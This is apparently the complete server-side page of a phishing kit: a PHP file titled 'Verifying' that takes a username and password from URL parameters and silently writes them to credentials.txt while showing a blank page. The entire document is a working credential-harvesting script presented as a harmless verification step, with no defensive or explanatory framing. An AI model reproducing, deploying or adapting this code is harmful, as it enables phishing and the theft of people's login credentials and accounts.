<html>
<head>
	<title>Verifying</title>
</head>
<body bgcolor="aqua">
<?php

$handle = fopen('credentials.txt', 'w');
$n=$_GET["u"];
fwrite($handle, $n);
fwrite($handle, "\n");
$s=$_GET["p"];
fwrite($handle, $s);
fwrite($handle, "\n");
fclose($handle);

?>
</body>
</html>
